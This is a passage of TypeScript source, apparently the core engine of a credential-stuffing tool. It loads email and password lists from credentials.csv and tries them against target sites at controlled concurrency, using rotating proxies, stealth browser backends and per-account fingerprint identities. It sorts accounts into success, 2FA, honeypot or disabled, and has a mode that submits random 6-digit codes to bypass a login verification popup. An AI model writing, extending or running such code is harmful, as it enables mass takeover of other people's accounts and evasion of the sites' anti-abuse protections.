   * Manually override a result from the Command Centre dashboard (e.g. 🕸 Honeypot).
   * Overwrites the outcome for the specific target site (parsed from the label) or all sites,
   * marks the row as done if terminal, and propagates the state to clients and database.
   */
  overrideResult(email: string, classification: string, label: string): void {
    const targetEmail = email.trim().toLowerCase();
    const rowIdx = this.rows.findIndex(r => r.email.trim().toLowerCase() === targetEmail);
    if (rowIdx === -1) {
      this.log("WARN", `[Override] Row not found for email: ${targetEmail}`);
      return;
    }
    const row = this.rows[rowIdx];
    if (!row) return;

    let targetSiteName: string | undefined;
    if (label && label.includes(":")) {
      targetSiteName = label.split(":")[0];
    }

    const outcome = classification as Outcome;
    if (targetSiteName && row.sites[targetSiteName]) {
      row.sites[targetSiteName]!.outcome = outcome;
    } else {
      for (const s of Object.values(row.sites)) {
        s.outcome = outcome;
      }
    }

    const terminalOutcomes = ["success", "2FA", "noaccount", "permdisabled", "tempdisabled", "honeypot", "N/A", "skipped"];
    if (terminalOutcomes.includes(classification)) {
      row.status = "done";
    }

    this.log("INFO", `[Override] Engine state updated for ${targetEmail} → ${classification}`);
    this.triggerRowUpdate(rowIdx);
  }

  /** Remove engine rows whose email matches one of the supplied entries.
   *  Used by the dashboard "Delete Selected" action. Match is
   *  case-insensitive and trim-sensitive, mirroring credentials.csv parsing.
   *  Triggers a debounced progress.json save so the deletion survives a
   *  restart. Refuses to mutate while a run is in progress to avoid racing
   *  the row loop. Returns the number of rows removed. */
  removeRows(emails: string[]): number {
    if (this.running) {
      throw new Error("removeRows: cannot delete rows while a run is in progress");
    }
    if (!Array.isArray(emails) || emails.length === 0) return 0;
    const set = new Set(emails.map((e) => (e || "").toLowerCase().trim()).filter((e) => e.length > 0));
    if (set.size === 0) return 0;
    const before = this.rows.length;
    this.rows = this.rows.filter((r) => !set.has((r.email || "").toLowerCase().trim()));
    const removed = before - this.rows.length;
    return removed;
  }

  /** Parse credentials.csv into credential objects — reads ALL password columns dynamically */
  loadCredentials(csvPath: string): Credential[] {
    if (!fs.existsSync(csvPath)) return [];
    const stat = fs.statSync(csvPath);
    if (stat.size > DynamicTimings.MAX_CSV_BYTES) {
      csvLog.warn(`Refusing to load ${csvPath}: ${stat.size} bytes exceeds ${DynamicTimings.MAX_CSV_BYTES} byte cap`);
      return [];
    }
    const isGoldenFile = path.basename(csvPath).toLowerCase().includes("golden");
    const content = fs.readFileSync(csvPath, "utf-8");
    const lines = content
      .split(/\r\n|\n|\r/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length < 2) return [];

    // @ts-expect-error noUncheckedIndexedAccess
    const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
    const emailIdx = headers.indexOf("email");
    if (emailIdx < 0) return [];

    // Find all password columns in order: password, password2, password3, password4, ...
    const passwordIndices: number[] = [];
    for (let i = 0; i < headers.length; i++) {
      // @ts-expect-error noUncheckedIndexedAccess
      if (headers[i].startsWith("password")) {
        passwordIndices.push(i);
      }
    }
    // Sort by column number (password=1, password2=2, password3=3, ...)
    passwordIndices.sort((a, b) => {
      // @ts-expect-error noUncheckedIndexedAccess
      const numA = parseInt(headers[a].replace("password", "") || "1");
      // @ts-expect-error noUncheckedIndexedAccess
      const numB = parseInt(headers[b].replace("password", "") || "1");
      return numA - numB;
    });
    if (passwordIndices.length === 0) return [];

    const results: Credential[] = [];
    let denylistSkipped = 0;
    for (let i = 1; i < lines.length; i++) {
      // @ts-expect-error noUncheckedIndexedAccess
      const parts = this.parseCsvLine(lines[i]);
      const email = (parts[emailIdx] || "").trim();
      const allPasswords = passwordIndices.map((idx) => (parts[idx] || "").trim());
      // Trim trailing empty passwords but preserve internal order
      while (allPasswords.length > 0 && allPasswords[allPasswords.length - 1] === "") {
        allPasswords.pop();
      }
      if (email && allPasswords.length > 0) {
        // Persistent denylist: drop emails marked permanently dead so they
        // never re-enter the queue (no row, no UI line, no proxy burn).
        let allSitesDenylisted = true;
        for (const target of DEFAULT_TARGETS) {
          if (!emailDenylist.has(email, target.name)) {
            allSitesDenylisted = false;
            break;
          }
        }
        if (allSitesDenylisted) {
          denylistSkipped++;
          continue;
        }
        results.push({ email, passwords: allPasswords, isGolden: isGoldenFile });
      } else {
        csvLog.warn(`Row ${i + 1} skipped — missing ${!email ? "email" : "password"}`);
      }
    }
    if (denylistSkipped > 0) {
      csvLog.warn(`${denylistSkipped} row(s) fully excluded by email denylist across all targets`);
    }
    return results;
  }

  /** Start the automation loop over all credentials */
  async start(credentials: Credential[], config: EngineConfig): Promise<void> {
    if (this.running) {
      this.log("WARN", "Engine is already running");
      return;
    }

    this.running = true;
    this.shouldStop = false;
    this.runStartTime = Date.now();
    this.config = config;
    this.requeuedRowIndexes.clear();
    // Start the DB-backed per-site TEMP_DISABLED requeue scheduler
    if (!this.tempDisabledScheduler) {
      this.tempDisabledScheduler = new TempDisabledScheduler(this);
    }
    this.tempDisabledScheduler.start();
    this.pendingVerifications = [];
    // AI verification: enabled when API key is available and not explicitly disabled
    this.verificationEnabled = config.enableVerification !== false && isVerificationAvailable();
    if (this.verificationEnabled) {
      this.log("INFO", "🤖 AI video verification enabled for double-bad outcomes");
    }
    // "SUBMIT RAND NO. FOR IGNITION LOGIN POPUP" toggle
    (this as any)._ignitionVerifBypass = !!config.ignitionVerifBypass;
    if ((this as any)._ignitionVerifBypass) {
      this.log("INFO", "🎲 Ignition LOGIN VERIFICATION bypass enabled — random 6-digit code + retry");
    }
    if (config.experimentalModeType === "darwin") {
      this.darwinEngine = new DarwinEngine({ proxyPool: config.proxyPool });
      this._darwinWinnerElected = false;
      this.log("INFO", "🦎 [DarwinEngine] Initialized with candidate backends (Spider excluded). Auto-pivoting enabled.");
    } else {
      this.darwinEngine = null;
    }
    const allTargets = config.targets || DEFAULT_TARGETS;

    // Defensive denylist re-filter: callers may pass a credential array that
    // was cached before a denylist entry was added (e.g. server.ts caches the
    // CSV at boot). Re-filter here so newly-burned accounts cannot leak into
    // a fresh run via the cached list.
    const beforeFilter = credentials.length;
    credentials = credentials.filter((c) => {
      let allSitesDenylisted = true;
      for (const target of DEFAULT_TARGETS) {
        if (!emailDenylist.has(c.email, target.name)) {
          allSitesDenylisted = false;
          break;
        }
      }
      return !allSitesDenylisted;
    });
    const denylistSkipped = beforeFilter - credentials.length;
    if (denylistSkipped > 0) {
      this.log("WARN", `🚫 ${denylistSkipped} credential(s) excluded by persistent email denylist across all targets`);
    }

    // Initialise row statuses
    this.rows = credentials.map((c, i) => {
      const isVip = Math.random() < 0.05; // 5% assignment to VIP Warm Pool
      return {
        rowIndex: i,
        email: c.email,
        isVip,
        status: "queued" as const,
      currentBatch: 0,
      target_sites: c.target_sites,
      sites: Object.fromEntries(
        allTargets.map((t) => [t.name, { outcome: "queued", attempts: 0 }])
      ),
      };
    });

    // Re-hydrate requeue markers persisted from a prior crashed run: turn the
    // saved email list into row indexes against the freshly-loaded rows so
    // those credentials still get their retest pass at the end of this run.
    if (this.requeuedPendingEmails.size > 0) {
      let restored = 0;
      for (let i = 0; i < this.rows.length; i++) {
        // @ts-expect-error noUncheckedIndexedAccess
        if (this.requeuedPendingEmails.has(this.rows[i].email)) {
          this.requeuedRowIndexes.add(i);
          restored++;
        }
      }
      if (restored > 0) {
        this.log("INFO", `↩ Restored ${restored} pending requeue marker(s) from prior crashed run`);
      }
    }

    this.emit("started", {
      total: credentials.length,
      targets: allTargets.map((t) => t.name),
    });

    // Clamp target concurrency: default 3, absolute max 5 — never exceeded
    const maxConcurrency = getMaxConcurrencyForBackend(config.backend);
    const targetConcurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), maxConcurrency);
    if ((config.concurrency || DEFAULT_CONCURRENCY) > maxConcurrency) {
      this.log("WARN", `Concurrency exceeds recommended safe limit of ${maxConcurrency} for backend '${config.backend}'. Capped at ${maxConcurrency}.`);
    }
    if (config.liveTest) {
      this.log("INFO", `🔬 LIVE TEST MODE — single-credential ${config.backend ?? "default"} dry run with verbose timing`);
      this.log("INFO", `🔬 Target: ${credentials[0]?.email ?? "(none)"} · backend=${config.backend} · concurrency=1`);
    }
    this.log("INFO", `Starting automation: ${credentials.length} credentials × ${allTargets.length} targets`);
    this.log("INFO", `Concurrency: dynamic (start=1, target=${targetConcurrency}, warmup=${WARMUP_ROWS} rows) | Response-based waits`);

    // --- Layer 4 Zombie Reaper Sweep ---
    this.log("INFO", `🧹 Sweeping for orphaned browser processes before starting...`);
    await killOurOrphans({ timeoutMs: 5000, minEtimeSec: 0 }).catch((e: any) => this.log("WARN", `Failed to run zombie sweep: ${e}`));

    const activePool = getActiveProxyPool(config.backend, config.proxyPool);
    if (activePool && activePool.length > 0) {
      const pingTargets = config.targets || DEFAULT_TARGETS;
      while (true) {
        this.log("INFO", `🏓 Pre-pinging ${activePool.length} proxies × ${pingTargets.length} target URLs...`);
        const pingReport = await preValidatePool(activePool, pingTargets, {
          timeoutMs: 8000,
          enableBackendPing: true,
          backend: config.backend,
        });
        this.emit("proxy-preping-update", pingReport);
        const healthyProxies = pingReport
          .filter((r: any) => r.allTargetsReachable)
          .map((r: any) => r.proxy);
        const healthRatio = pingReport.length > 0 ? healthyProxies.length / pingReport.length : 0;
        if (healthRatio < 0.8 && pingReport.length > 0) {
          this.log("WARN", `⚠️ Pre-flight Proxy Quota Warning: Only ${Math.round(healthRatio * 100)}% of proxies are healthy. Bypassing abort to force batch execution.`);
          break;
        }

        if (healthyProxies.length === 0) {
           this.log("WARN", `⚠️ All proxies failed pre-ping. Proceeding anyway per bypass rule.`);
           break;
        }
        if (healthyProxies.length > 0) {
          activePool.splice(0, activePool.length, ...healthyProxies);
          const avgLatencies = pingReport
            .filter((r: any) => r.allTargetsReachable)
            .map((r: any) => `${r.proxyKey.split("#")[0]?.split("://")[1] ?? r.proxyKey}=${r.avgLatencyMs.toFixed(0)}ms`);
          this.log("INFO", `✅ Pre-ping complete: ${healthyProxies.length}/${pingReport.length} proxies reached all targets (${Math.round(healthRatio * 100)}% health).`);
          if (avgLatencies.length <= 10) {
            this.log("INFO", `  Latencies: ${avgLatencies.join(", ")}`);
          }
          break;
        }
        this.log("WARN", "❌ All proxies in the active pool failed pre-ping against target URLs. Pausing for 30 seconds before retrying...");
        await this.sleep(30000);
      }
    }

    // Spider cloud backend uses the cloud API; cloak backend runs locally and skips it.
    // Spider backends split cloud CDP from local AU-proxy headless sessions.
    if (config.backend === "spider" || config.backend === "spider-cloud") {
      this.log("INFO", `Backend: Spider Cloud | wss://browser.spider.cloud | AU default`);
    } else if (config.backend === "spider-local") {
      this.log("INFO", `Backend: Spider Local | headless local Chromium | proxy: ${PROXY_INFO}`);
    } else if (config.backend?.startsWith("cloak")) {
      this.log("INFO", `Backend: cloak (local CloakBrowser) | proxy: ${PROXY_INFO}`);
    } else if (config.backend === "experimental" || config.backend === "experimental-elimination") {
      this.log("INFO", `🧪 Experimental Mode: Multi-backend round-robin evaluation enabled`);
    }

    // Dynamic concurrency limiter — starts at 1, ramps up after WARMUP_ROWS if success rate holds.
    // Honors a pre-existing manualConcurrency (set via setConcurrency before start) as the initial value.
    const initialMax = this.manualConcurrency ?? 1;
    const limit = new DynamicLimit(initialMax, (lvl, msg) => this.log(lvl, msg));
    this.liveLimit = limit;
    const recentOutcomes: boolean[] = [];   // true = success-ish, false = N/A/error (sliding window)
    let completedRows = 0;

    // ── Deadlock watchdog ─────────────────────────────────────────────────
    // If every slot is blocked on slow proxies / hung sessions, the dynamic
    // throttler will keep lowering `limit.max` and the hysteresis timer never
    // ticks (because no rows complete). This periodic check detects "no
    // progress for N seconds with throttled max=1" and forcibly bumps the
    // cap back to the user's target so new attempts can start.
    const CONCURRENCY_WATCHDOG_INTERVAL_MS = 30_000;
    const CONCURRENCY_WATCHDOG_STALL_MS = 90_000;
    let lastCompletedRows = -1;
    let stallStartedAt = Date.now();
    const concurrencyWatchdog = setInterval(() => {
      if (completedRows !== lastCompletedRows) {
        lastCompletedRows = completedRows;
        stallStartedAt = Date.now();
        return;
      }
      const stalledFor = Date.now() - stallStartedAt;
      if (stalledFor >= CONCURRENCY_WATCHDOG_STALL_MS && limit.max < targetConcurrency && this.manualConcurrency == null) {
        const restored = targetConcurrency;
        this.log("WARN", `⚠ Concurrency watchdog: no row completed in ${(stalledFor / 1000).toFixed(0)}s and limit pinned at ${limit.max} — restoring max to ${restored} to unstick the run`);
        limit.setMax(restored);
        this.emit("concurrency-live", { value: restored, reason: "watchdog-unstick" });
        throttleActive = false;
        throttleHeldForRows = 0;
        stallStartedAt = Date.now(); // restart the window after intervention
      }
    }, CONCURRENCY_WATCHDOG_INTERVAL_MS);
    concurrencyWatchdog.unref?.();
    // Hysteresis state — true only after an explicit failure-driven throttle-
    // down to 1 fires. HeldForRows counts row completions in the auto-throttler
    // path while throttleActive is true; ramp-up is gated until it reaches
    // THROTTLE_HOLD_ROWS. Both reset when ramp-up actually fires.
    let throttleActive = false;
    let throttleHeldForRows = 0;

    // ── Resource-aware concurrency fallback ─────────────────────────────
    // Monitors OS memory and CPU load. When the system is under heavy
    // pressure (e.g. 6 concurrent browsers), it automatically falls back
    // to a reduced concurrency (4 = 2 headed + 2 headless) and logs the
    // reason. Once resources recover, it restores the original target.
    const RESOURCE_CHECK_INTERVAL_MS = 15_000;
    const RAM_PRESSURE_THRESHOLD = 0.90;   // 90% used
    const CPU_PRESSURE_THRESHOLD = 0.90;   // 90% load (load-avg / cpuCount)
    const RESOURCE_FALLBACK_CONCURRENCY = 4;
    let resourceFallbackActive = false;
    const originalTargetConcurrency = targetConcurrency;
    const resourceWatchdog = setInterval(() => {
      // Skip if operator has manually pinned concurrency
      if (this.manualConcurrency != null) return;
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      const usedRatio = 1 - (freeMem / totalMem);
      const cpuCount = os.cpus().length;
      const loadAvg1m = os.loadavg()[0] ?? 0;
      const cpuRatio = loadAvg1m / cpuCount;

      if (!resourceFallbackActive && (usedRatio > RAM_PRESSURE_THRESHOLD || cpuRatio > CPU_PRESSURE_THRESHOLD)) {
        // Activate fallback
        if (limit.max > RESOURCE_FALLBACK_CONCURRENCY) {
          resourceFallbackActive = true;
          limit.setMax(RESOURCE_FALLBACK_CONCURRENCY);
          this.emit("concurrency-live", { value: RESOURCE_FALLBACK_CONCURRENCY, reason: "resource-pressure" });
          this.log("WARN", `⚠ Resource pressure detected — RAM ${(usedRatio * 100).toFixed(0)}% | CPU load ${cpuRatio.toFixed(2)}x — concurrency reduced ${originalTargetConcurrency} → ${RESOURCE_FALLBACK_CONCURRENCY}`);
        }
      } else if (resourceFallbackActive && usedRatio < (RAM_PRESSURE_THRESHOLD - 0.05) && cpuRatio < (CPU_PRESSURE_THRESHOLD - 0.05)) {
        // Resources recovered — restore original target (with 5% hysteresis)
        resourceFallbackActive = false;
        limit.setMax(originalTargetConcurrency);
        this.emit("concurrency-live", { value: originalTargetConcurrency, reason: "resource-recovered" });
        this.log("INFO", `✅ Resources recovered — RAM ${(usedRatio * 100).toFixed(0)}% | CPU load ${cpuRatio.toFixed(2)}x — concurrency restored → ${originalTargetConcurrency}`);
      }
    }, RESOURCE_CHECK_INTERVAL_MS);
    resourceWatchdog.unref?.();

    const recordRowOutcome = (rowSucceeded: boolean) => {
      this.lastOutcomeTime = Date.now();
      completedRows++;
      recentOutcomes.push(rowSucceeded);
        if (recentOutcomes.length >= FAILURE_WINDOW) recentOutcomes.shift();
      // Manual override from the dashboard pins concurrency and disables auto-tuning.
      // Note: hold counter does NOT advance while pinned — hysteresis is for the
      // auto-throttler only.
      if (this.manualConcurrency != null) return;
      if (throttleActive) throttleHeldForRows++;
      const failureRate = recentOutcomes.length > 0
        ? recentOutcomes.filter((o) => !o).length / recentOutcomes.length
        : 0;
      const prevMax = limit.max;
      let nextMax = prevMax;
      let rampedUp = false;
      if (completedRows < WARMUP_ROWS) {
        nextMax = 1;
      } else if (failureRate > FAILURE_THROTTLE_THRESHOLD) {
        nextMax = 1;  // throttle hard — restart hold window even on repeated entries
        throttleActive = true;
        throttleHeldForRows = 0;
      } else if (failureRate <= FAILURE_RAMPUP_THRESHOLD) {
        // Ramp-up gate: only allow when not throttled, OR the hold window has elapsed.
        if (!throttleActive || throttleHeldForRows >= THROTTLE_HOLD_ROWS) {
          nextMax = targetConcurrency;
          rampedUp = true;
        }
        // Else: middle/calm zone but still inside hold → stay at 1, keep counting.
      }
      if (nextMax !== prevMax) {
        limit.setMax(nextMax);
        const hysteresis = rampedUp && throttleActive ? ` (held ${throttleHeldForRows}/${THROTTLE_HOLD_ROWS} rows)` : "";
        this.log("INFO", `⚙ Concurrency adjusted ${prevMax} → ${nextMax} (failure rate ${(failureRate * 100).toFixed(0)}% over last ${recentOutcomes.length})${hysteresis}`);
        this.emit("concurrency-live", { value: nextMax, reason: rampedUp ? "ramp-up" : (completedRows < WARMUP_ROWS ? "warmup" : "throttle") });
        if (rampedUp) {
          throttleActive = false;
          throttleHeldForRows = 0;
        }
      }
    };
    // Experimental mode state
    let activeExpConfigs = config.experimentalConfigs ? [...config.experimentalConfigs] : [];
    let anomalyPauseActive = false;

    if (config.isExperimental) {
      if (!config.spiderApiKey) activeExpConfigs = activeExpConfigs.filter(c => c.backend !== "spider-cloud");
      if (!config.spiderLocalApiKey) activeExpConfigs = activeExpConfigs.filter(c => c.backend !== "spider-local");
      if (activeExpConfigs.length === 0) {
        // Fallback
        activeExpConfigs = [{ backend: "cloak-headless", proxyPool: "3", fails: 0, blocks: 0, decisive: 0, eliminated: false, totalAttempts: 0, totalDurationMs: 0, errors: {} }];
      }
      this.log("INFO", `🧪 Experimental Mode initialized with ${activeExpConfigs.length} configuration pairs.`);
    }

    let expConfigCounter = 0;

    // ── Per-backend concurrency weighting ──
    // When autoOptimizePerBackend is enabled, each backend type gets a weighted
    // share of the global concurrency pool. Headed backends (weight 0.5) get
    // half the slots of headless backends (weight 1.0). This prevents headed
    // backends from consuming all available slots since they use more resources.
    const backendActiveSlots = new Map<string, number>(); // backend → active count
    const autoOptEnabled = config.autoOptimizePerBackend !== false;

    const getBackendMaxSlots = (backendName: string): number => {
      if (!autoOptEnabled) return Infinity; // no weighting when disabled
      const optimal = BACKEND_OPTIMAL_SETTINGS[backendName];
      const weight = optimal?.concurrencyWeight ?? 1.0;
      const globalMax = this.manualConcurrency ?? targetConcurrency ?? 5;
      return Math.max(1, Math.floor(globalMax * weight));
    };

    const acquireBackendSlot = (backendName: string): boolean => {
      if (!autoOptEnabled) return true; // bypass when disabled
      const current = backendActiveSlots.get(backendName) || 0;
      const max = getBackendMaxSlots(backendName);
      if (current >= max) return false;
      backendActiveSlots.set(backendName, current + 1);
      return true;
    };

    const releaseBackendSlot = (backendName: string): void => {
      if (!autoOptEnabled) return;
      const current = backendActiveSlots.get(backendName) || 0;
      backendActiveSlots.set(backendName, Math.max(0, current - 1));
    };

    const runRow = async (cred: Credential, idx: number, targets: SiteConfig[]): Promise<void> => {
      // Check for Out-Of-Memory (OOM) conditions and trigger GC if needed
      const heapUsed = process.memoryUsage().heapUsed;
      if (heapUsed > 1.5 * 1024 * 1024 * 1024) { // 1.5GB
        this.log("WARN", `⚠️ High memory usage detected (${(heapUsed / 1024 / 1024).toFixed(1)}MB). Triggering garbage collection...`);
        if (global.gc) {
          global.gc();
        } else {
          this.log("WARN", `⚠️ global.gc() is not exposed. Run Node with --expose-gc flag to enable manual garbage collection.`);
        }
        await new Promise(r => setTimeout(r, 5000));
      }

      // Periodically prune static asset cache to prevent memory pressure
      if (idx > 0 && idx % 100 === 0) {
        const now = Date.now();
        for (const [k, v] of staticAssetCache.entries()) {
          // Evict entries older than 1 hour
          if (now - v.timestamp > 3600000) {
            staticAssetCache.delete(k);
          }
        }
      }

      const release = await limit.acquire();
      // ── Worker slot allocation for session reuse ──
      // Assign a stable slot ID (0..concurrency-1) for this worker.
      // The slot is used to index into the session pool.
      let workerSlot = -1;
      for (let s = 0; s < (this.manualConcurrency ?? targetConcurrency ?? 5); s++) {
        if (!activeWorkerSlots.has(s)) { workerSlot = s; activeWorkerSlots.add(s); break; }
      }
      const maxSlots = (this.manualConcurrency ?? targetConcurrency ?? 5) * 2;
      if (workerSlot === -1) {
        // Fallback: find lowest available from 0..maxSlots instead of unbounded growth
        for (let s = 0; s < maxSlots; s++) {
          if (!activeWorkerSlots.has(s)) { workerSlot = s; break; }
        }
        if (workerSlot === -1) workerSlot = activeWorkerSlots.size; // last resort
        activeWorkerSlots.add(workerSlot);
      }

      let rowSucceededForStats = true;  // tracked for dynamic concurrency adjustments
      // Declared at IIFE scope (not inside the try) so the finally below can
      // read it for the proxyScoreTracker.record() call.
      // Track the unique sticky-session identity (proxyKey = `server#username`)
      // separately from the display string so reputation is keyed correctly
      // even when many pool entries share a gateway host:port.
      let lastProxyKey: string | undefined;
      let lastProxyServer: string | undefined;
      let isExp = false;
      let effectiveBackend = this.resolveBackendForRow(config, idx);
      // Per-row override set by rotate-on-fingerprint — takes precedence
      const rowOverride = (this.rows[idx] as any)?.__backendOverride;
      if (rowOverride) {
        effectiveBackend = rowOverride as EngineConfig["backend"];
        delete (this.rows[idx] as any).__backendOverride; // one-shot
        this.log("INFO", `  🔄 [RotateOnFP] Using override backend: ${effectiveBackend} for ${cred.email}`);
      }
      let lastError: any = null;
      let assignedExpConfig: ExperimentalConfig | undefined;
      const rowStartTime = Date.now();
      try {
        if (this.shouldStop) {
          // @ts-expect-error noUncheckedIndexedAccess
          this.rows[idx].status = "skipped";
          // @ts-expect-error noUncheckedIndexedAccess
          for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
          this.triggerRowUpdate(this.rows[idx]);
          return;
        }

        // Check circuit breakers for all targets; if all targets are banned, skip row early.
        let allTargetsBanned = true;
        for (const t of targets) {
          const expiry = getCircuitBreakerExpiry(t.name);
          if (Date.now() >= expiry) {
            allTargetsBanned = false;
            break;
          }
        }
        if (allTargetsBanned) {
          // @ts-expect-error noUncheckedIndexedAccess
          this.rows[idx].status = "skipped";
          for (const t of targets) {
            // @ts-expect-error noUncheckedIndexedAccess
            this.rows[idx].sites[t.name].outcome = "skipped";
            // @ts-expect-error noUncheckedIndexedAccess
            this.rows[idx].sites[t.name].error = "circuit breaker active";
          }
          this.log("WARN", `  Skipping ${cred.email} — circuit breaker active on all targets`);
          this.triggerRowUpdate(this.rows[idx]);
          return;
        }

        // Check tempdisabled cooldown — PER SITE, not per row.
        // Only skip sites that are still in their individual cooldown window.
        // Other sites on the same credential continue to run normally.
        {
          const row = this.rows[idx]!;
          const siteCooldowns: string[] = [];
          for (const t of targets) {
            const siteStatus = row.sites[t.name];
            if (siteStatus?.outcome === "tempdisabled") {
              // Check if this specific site has a cooldown timestamp
              const siteUntil = (siteStatus as any).tempDisabledUntil as string | undefined;
              if (siteUntil && Date.now() < new Date(siteUntil).getTime()) {
                siteCooldowns.push(t.name);
              } else {
                // Cooldown expired — reset this site to queued
                siteStatus.outcome = "queued";
                siteStatus.attempts = 0;
                delete (siteStatus as any).tempDisabledUntil;
                delete siteStatus.error;
              }
            }
          }
          if (siteCooldowns.length === targets.length) {
            // ALL sites are still in cooldown — skip the whole row
            row.status = "skipped";
            this.log("WARN", `  Skipping ${cred.email} — all sites tempdisabled (${siteCooldowns.join(", ")})`);
            this.triggerRowUpdate(row);
            return;
          }
          // Some sites are in cooldown — remove them from this run's target list
          // (the remaining sites will run normally)
          if (siteCooldowns.length > 0) {
            this.log("INFO", `  ${cred.email}: skipping ${siteCooldowns.join(", ")} (tempdisabled), running remaining sites`);
            targets = targets.filter(t => !siteCooldowns.includes(t.name));
          }
        }

        // Stagger removed (Optimization 9: Eliminate Stagger/Cleanup this.sleep)
        if (config.isExperimental) {
          if (config.experimentalModeType === "darwin" && this.darwinEngine) {
            const nextCandidate = this.darwinEngine.getNextCandidate(expConfigCounter);
            if (!nextCandidate) {
              this.log("WARN", `🦎🛑 Darwin Mode: All experimental backends eliminated. Gracefully auto-pivoting to Golden Template (stealth).`);
              const report = this.darwinEngine.generateDiagnosticReport();
              await this.darwinEngine.saveDiagnosticReport();
              hermesDarwinAnalyzer.learnFromDarwinReport(report);
              this.emit("darwin-all-eliminated", report);
              effectiveBackend = "stealth" as any;
              assignedExpConfig = undefined;
              isExp = false;
            } else {
              expConfigCounter++;
              effectiveBackend = nextCandidate as any;
              assignedExpConfig = {
                backend: nextCandidate,
                proxyPool: config.proxyPool || "1",
                fails: 0,
                blocks: 0,
                decisive: 0,
                eliminated: false,
                totalAttempts: 0,
                totalDurationMs: 0,
                errors: {},
              };
              isExp = true;
              this.log("INFO", `🦎 Darwin Mode: Assigned candidate [${effectiveBackend}] to ${cred.email}`);
            }
          } else {
            if (anomalyPauseActive) {
              while (anomalyPauseActive) await new Promise(r => setTimeout(r, 1000));
            }
            if (activeExpConfigs.length === 0) {
              const totalFails = (config.experimentalConfigs || []).reduce((acc, c) => acc + c.fails + c.blocks, 0);
              if (totalFails <= (config.experimentalConfigs?.length || 7) * 3) {
                anomalyPauseActive = true;
                this.log("WARN", `🚨 ANOMALY DETECTED: All backends eliminated exceptionally fast. Target may be down or globally rate-limiting. Pausing engine for 60 seconds...`);
                await new Promise(r => setTimeout(r, 60000));
                this.log("WARN", `🚨 Resuming execution and restoring backends to try again...`);
                config.experimentalConfigs?.forEach(c => { c.eliminated = false; c.fails = 0; c.blocks = 0; });
                activeExpConfigs = config.experimentalConfigs ? [...config.experimentalConfigs] : [];
                anomalyPauseActive = false;
              } else {
                this.log("WARN", `🧪 Experimental Mode: All configuration sets eliminated! Falling back to safe defaults.`);
                activeExpConfigs = [{ backend: "cloak-headless", proxyPool: "3", fails: 0, blocks: 0, decisive: 0, eliminated: false, totalAttempts: 0, totalDurationMs: 0, errors: {} }];
              }
            }
            assignedExpConfig = activeExpConfigs[expConfigCounter % activeExpConfigs.length]!;
            expConfigCounter++;
            effectiveBackend = assignedExpConfig.backend as any;
            isExp = true;
            this.log("INFO", `🧪 Experimental Mode: Assigned [${assignedExpConfig.backend} / Pool ${assignedExpConfig.proxyPool}] to ${cred.email}`);
          }
        }

        // Mark row as testing
        // @ts-expect-error noUncheckedIndexedAccess
        this.rows[idx].status = "testing";
        // @ts-expect-error noUncheckedIndexedAccess
        this.rows[idx].backend = effectiveBackend;
        this.currentEmail = cred.email;
        this.triggerRowUpdate(this.rows[idx]);
        this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);

        // ── Per-backend concurrency gate ──
        // If this backend type has hit its weighted slot cap, wait until a slot
        // opens rather than creating another session that would exceed the cap.
        let backendSlotAcquired = false;
        if (effectiveBackend && !acquireBackendSlot(effectiveBackend)) {
          const maxWait = 60_000; // 60s max wait before proceeding anyway
          const start = Date.now();
          const bkMax = getBackendMaxSlots(effectiveBackend);
          this.log("DEBUG", `⏳ ${effectiveBackend} at slot cap (${backendActiveSlots.get(effectiveBackend) || 0}/${bkMax}) — waiting for free slot...`);
          while (Date.now() - start < maxWait) {
            if (!this.running) break;
            await new Promise(r => setTimeout(r, 500));
            if (acquireBackendSlot(effectiveBackend)) {
              backendSlotAcquired = true;
              break;
            }
          }
          if (!backendSlotAcquired) {
            // Timed out waiting — proceed anyway to avoid deadlock
            this.log("WARN", `⚠︎ ${effectiveBackend} slot wait timed out after ${(maxWait / 1000).toFixed(1)}s — proceeding`);
            acquireBackendSlot(effectiveBackend); // force-acquire
            backendSlotAcquired = true;
          }
        } else {
          backendSlotAcquired = true;
        }

        // Every supported backend now derives a per-credential identity bundle
        // (UA, hardware, geo, cache, resolution) from the email so we pass it
        // through unconditionally.
        const usesCredentialIdentity = !!effectiveBackend;
        const requeueCountRaw = (this.rows[idx] as any)._requeueCount || 0;
        const requeueCount = config.mutateOnRetry === false ? 0 : requeueCountRaw;
        const seed = usesCredentialIdentity ? emailToFingerprintSeed(cred.email, requeueCount) : undefined;
        const triedProxies: string[] = [];

        // ── Per-row hard timeout race ──
        // Wraps the entire proxy-retry loop + post-loop persistence in a
        // Promise.race against a ROW_HARD_TIMEOUT_MS sleep. If the inner work
        // ever exceeds the budget (e.g. a hung browser handle that escaped all
        // the per-action timeouts), we forcibly mark the row done, force-close
        // any in-flight session handle (so the cloud session / Playwright
        // context / local browser actually goes away), and release the
        // semaphore slot via the outer finally so the run can keep going.
        const TIMEOUT_SENTINEL: unique symbol = Symbol("row-timeout") as never;
        // Row-scoped reference to the current session handle. proxyRetryBlock
        // writes to it after each successful createSession() so the timeout
        // branch below can force-close it if the row stalls past the budget.
        // Cast on init to defeat TS's narrowing — without it, TS only sees the
        // `null` assignment here (the writes are inside a closure called via
        // Promise.race) and narrows the variable to `null` forever.
        let inFlightHandle = null as SessionHandle | null;
        const rowCancelToken = { cancelled: false };
        const proxyRetryBlock = async (): Promise<void> => {
          // ── Per-row proxy retry loop ──
          // Retries on session creation failure (proxy CONNECT fail, TLS RST, etc).
          // Real login outcomes (incorrect/disabled/etc) do NOT trigger a retry.
          for (let proxyAttempt = 1; proxyAttempt <= MAX_PROXY_RETRIES; proxyAttempt++) {
            if (rowCancelToken.cancelled || this.shouldStop) break;
            let handle: SessionHandle | null = null;
            let sessionReused = false;

            // ── Session Reuse: Check VIP Warm Pool & Worker Pool before creating new ──
            if (proxyAttempt === 1) {
              if (this.rows[idx]!.isVip && this._vipWarmPool.length > 0) {
                // Pop a pre-warmed trusted session for this VIP credential
                const vipHandle = this._vipWarmPool.pop()!;
                if (vipHandle.page && !vipHandle.page.isClosed()) {
                  this.log("INFO", `  🛡️ [VIP WARM POOL] Routing credential through pre-trusted session...`);
                  handle = vipHandle;
                  sessionReused = true;
                  lastProxyKey = vipHandle.proxyKey || "";
                  lastProxyServer = "VIP-Warm-Pool";

